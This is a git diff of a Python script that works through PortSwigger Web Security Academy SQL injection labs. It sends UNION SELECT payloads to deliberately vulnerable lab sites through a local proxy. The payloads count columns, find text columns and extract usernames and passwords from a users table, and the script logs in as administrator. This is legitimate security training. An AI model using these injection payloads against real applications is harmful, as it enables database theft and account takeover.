@@ -1,16 +1,17 @@
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+# https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://ac651f4d1e173933800c27ee00450003.web-security-academy.net"
+base = "https://ac991f851eb890e0802753a1005d0035.web-security-academy.net"
 path = "/filter"
 url = base + path
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
-cookies = {"session": "W3v9bhxkX3IXCZnRFbyugBAOMY1f2GmB"}
+cookies = {"session": "Need a valid session token here"}
 verify = False
 
 def determineNumberOfColumnsLab():
@@ -48,6 +49,15 @@ def findColumnContainingTextLab():
         params = {"category": q}
         requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
 
+def loginWithPassword():
+        username = "administrator"
+        password = "stdnya4z3y5ehb4j4atv"
+
+        q = f"' UNION SELECT {username}, {password} FROM users-- "
+        data = {"csrf": "Need a valid CSRF token here", "username": username, "password": password}
+        url = base + "/login"
+        requests.post(url, data=data, cookies=cookies, verify=verify, proxies=proxies)
+
 def retrieveDataFromOtherTables():
     def getPassword():
         username = "username"
@@ -57,19 +67,20 @@ def retrieveDataFromOtherTables():
         params = {"category": q}
         requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
 
-    def loginWithPassword():
-        username = "administrator"
-        password = "y0j2xzbsm1xu3aghso67"
+    getPassword()
+    # loginWithPassword()
 
-        q = f"' UNION SELECT {username}, {password} FROM users-- "
-        data = {"csrf": "WKs3hfGISY4BwMNheiZM0ZPG6vZJJjw8", "username": username, "password": password}
-        url = base + "/login"
-        requests.post(url, data=data, cookies=cookies, verify=verify, proxies=proxies)
+def retrieveMultipleValuesInSingleColumn():
+    def getPassword():
+        q = "' UNION SELECT NULL, username || '~' || password FROM users-- "
+        params = {"category": q}
+        requests.get(url, verify=verify, params=params, cookies=cookies, proxies=proxies)
 
     getPassword()
     # loginWithPassword()
 
 
-# determineNumberOfColumnsLab()
+determineNumberOfColumnsLab()
 # findColumnContainingTextLab()
-retrieveDataFromOtherTables()
+# retrieveDataFromOtherTables()
+# retrieveMultipleValuesInSingleColumn()
